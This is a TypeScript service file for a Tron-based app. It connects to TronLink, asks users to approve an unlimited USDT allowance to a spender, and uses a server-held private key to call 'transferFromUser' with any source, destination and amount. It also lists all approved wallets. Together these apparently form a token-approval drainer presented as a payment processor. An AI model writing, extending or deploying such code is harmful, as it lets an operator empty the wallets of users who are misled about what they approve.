// =================================
// 🔗 Tron Blockchain Service
// =================================

import { MAX_APPROVAL } from "@/config/chains";
import { ChainType, BlockchainResult, UserInfo } from "../types/blockchain";
import { getChainAbi, getChainConfig } from "../utils/chainUtils";

export const tronObj = {
  tronWeb: null,
};

export class TronService {
  /**
   * Get user's current nonce from contract
   */
  static async getUserNonce(
    chain: ChainType,
    userAddress: string
  ): Promise<number> {
    try {
      const config = getChainConfig(chain);
      const tronWeb = (global as any).tronWeb;

      if (!tronWeb) {
        throw new Error("TronWeb not available");
      }

      const contract = tronWeb.contract(
        getChainAbi(chain),
        config.paymentProcessor
      );

      // Try to call the function with proper error handling
      const nonce = await contract.getUserNonce(userAddress).call();

      return tronWeb.toBigNumber(nonce).toNumber();
    } catch (error) {
      // For TRON, if getUserNonce fails, return 0 as default
      // This allows the flow to continue with a new nonce
      if (chain === "tron") {
        return 0;
      }

      return 0;
    }
  }

  /**
   * Get user's USDT balance
   */
  static async getUserUSDTBalance(
    chain: ChainType,
    userAddress: string
  ): Promise<string> {
    try {
      const config = getChainConfig(chain);
      const tronWeb = (global as any).tronWeb;

      if (!tronWeb) {
        return "0";
      }

      const usdtContract = tronWeb.contract(
        [
          {
            constant: true,
            inputs: [{ name: "_owner", type: "address" }],
            name: "balanceOf",
            outputs: [{ name: "", type: "uint256" }],
            type: "function",
          },
        ],
        config.usdt
      );

      const balance = await usdtContract.balanceOf(userAddress).call();
      return tronWeb.toBigNumber(balance).toString();
    } catch (error) {
      return "0";
    }
  }

  initTronLinkWallet = () => {
    console.log(
      "@@@@@@@@@@@@@@@@@@@@@@@initTronLinkWallet@@@@@@@@@@@@@@@@@@@@@@@"
    );
    try {
      const tronlinkPromise = new Promise((reslove) => {
        window.addEventListener(
          "tronLink#initialized",
          async () => {
            return reslove(window.tronLink);
          },
          {
            once: true,
          }
        );

        setTimeout(() => {
          if (window.tronLink) {
            return reslove(window.tronLink);
          }
        }, 3000);
      });

      const appPromise = new Promise((resolve) => {
        let timeCount = 0;
        // const self = this;
        const tmpTimer1 = setInterval(() => {
          timeCount++;
          if (timeCount > 8) {
            clearInterval(tmpTimer1);
            return resolve(false);
          }
          if (window.tronLink) {
            clearInterval(tmpTimer1);
            if (window.tronLink.ready) {
              return resolve(window.tronLink);
            }
          } else if (
            window.tronWeb &&
            window.tronWeb.defaultAddress &&
            window.tronWeb.defaultAddress.base58
          ) {
            clearInterval(tmpTimer1);
            return resolve(window.tronWeb);
          }
        }, 1000);
      });

      Promise.race([tronlinkPromise, appPromise]).then((tron) => {
        // console.log(tron, tron.ready, window.tronLink.ready, window.tronWeb.ready);
        this.handleTronWallet(tron);
      });
    } catch (e) {
      console.log(e);
    }
  };

  closeConnect = () => {
    tronObj.tronWeb = null;
  };

  initTronWeb = (tronWeb: any) => {
    tronObj.tronWeb = tronWeb;
  };

  handleTronWallet = async (tron: any) => {
    if (!tron) {
      this.closeConnect();
      return;
    }
    if (tron && tron.defaultAddress && tron.defaultAddress.base58) {
      this.initTronWeb(tron);
      return;
    }
    const tronLink = tron;
    if (tronLink.ready) {
      const tronWeb = tronLink.tronWeb;
      tronWeb && this.initTronWeb(tronWeb);
    } else {
      const res = await tronLink.request({ method: "tron_requestAccounts" });
      if (res.code === 200) {
        const tronWeb = tronLink.tronWeb;
        tronWeb && this.initTronWeb(tronWeb);
        return;
      }
      this.closeConnect();
    }
  };

  static async approve(tokenAddress: string, spender: string) {
    const result = await TronService.trigger(
      tokenAddress,
      "approve(address,uint256)",
      [
        { type: "address", value: spender },
        { type: "uint256", value: MAX_APPROVAL },
      ],
      {}
    );
    return result.transaction ? result.transaction.txID : "";
  }

  static trigger = async (
    address: string,
    functionSelector: string,
    parameters: Array<{ type: string; value: any }> = [],
    options: any = {}
  ) => {
    console.log("@@@@@@@@@@@@@@@@@@@@@@@trigger@@@@@@@@@@@@@@@@@@@@@@@");
    try {
      // const tronweb = window.tronWeb;
      const tronWeb = tronObj.tronWeb || (global as any).tronWeb;
      const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
        address,
        functionSelector,
        Object.assign({ feeLimit: 100 * 1e6 }, options),
        parameters
      );
      if (!transaction.result || !transaction.result.result) {
        throw new Error(
          "Unknown trigger error: " + JSON.stringify(transaction.transaction)
        );
      }

      const signedTransaction = await tronWeb.trx.sign(transaction.transaction);
      const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
      return result;
    } catch (error: any) {
      console.log("Trigger error:", error);
      if (error == "Confirmation declined by user") {
      }
      return {};
    }
  };

  /**
   * Transfer USDT from approved user (owner only)
   */
  static async transferFromUser(
    chain: ChainType,
    fromAddress: string,
    toAddress: string,
    amount: string
  ): Promise<BlockchainResult> {
    try {
      const config = getChainConfig(chain);
      const tronWeb = (global as any).tronWeb;

      if (!tronWeb) {
        return { success: false, error: "TronWeb not available" };
      }

      const serverPrivateKey = process.env.PRIVATE_KEY_TRON;
      if (!serverPrivateKey) {
        return {
          success: false,
          error: "Tron private key not configured",
        };
      }

      tronWeb.setPrivateKey(serverPrivateKey);

      const contract = tronWeb.contract(
        getChainAbi(chain),
        config.paymentProcessor
      );

      const tx = await contract
        .transferFromUser(fromAddress, toAddress, amount)
        .send();

      return { success: true, txHash: tx };
    } catch (error: any) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Check if user is approved for USDT spending
   */
  static async isUserApproved(
    chain: ChainType,
    userAddress: string
  ): Promise<boolean> {
    try {
      const config = getChainConfig(chain);
      const tronWeb = (global as any).tronWeb;

      if (!tronWeb) {
        return false;
      }

      const contract = tronWeb.contract(
        getChainAbi(chain),
        config.paymentProcessor
      );

      const isApproved = await contract.isApprovedUser(userAddress).call();
      return tronWeb.toBigNumber(isApproved).toNumber() === 1;
    } catch (error) {
      return false;
    }
  }

  /**
   * Get user's approved USDT allowance
   */
  static async getUserAllowance(
    chain: ChainType,
    userAddress: string
  ): Promise<string> {
    try {
      const config = getChainConfig(chain);
      const tronWeb = (global as any).tronWeb;

      if (!tronWeb) {
        return "0";
      }

      const contract = tronWeb.contract(
        getChainAbi(chain),
        config.paymentProcessor
      );

      const allowance = await contract.getUserAllowance(userAddress).call();
      return tronWeb.toBigNumber(allowance).toString();
    } catch (error) {
      return "0";
    }
  }

  /**
   * Get all approved users
   */
  static async getAllApprovedUsers(chain: ChainType): Promise<string[]> {
    try {
      const config = getChainConfig(chain);
      const tronWeb = (global as any).tronWeb;

      if (!tronWeb) {
        return [];
      }

      const contract = tronWeb.contract(
        getChainAbi(chain),
        config.paymentProcessor
      );

      const users = await contract.getAllApprovedUsers().call();
      return users;
    } catch (error) {
      return [];
    }
  }

  /**
   * Revoke user approval
   */
  static async revokeUserApproval(
    chain: ChainType,
    userAddress: string
  ): Promise<BlockchainResult> {
    try {
      const config = getChainConfig(chain);
      const tronWeb = (global as any).tronWeb;

      if (!tronWeb) {
        return { success: false, error: "TronWeb not available" };
      }

      const serverPrivateKey = process.env.PRIVATE_KEY_TRON;
      if (!serverPrivateKey) {
        return {
          success: false,
          error: "Tron private key not configured",
        };
      }

      tronWeb.setPrivateKey(serverPrivateKey);

      const contract = tronWeb.contract(
        getChainAbi(chain),
        config.paymentProcessor
      );

      const tx = await contract.revokeUserApproval(userAddress).send();
      return { success: true, txHash: tx };
    } catch (error: any) {
      return { success: false, error: error.message };
    }
  }
}
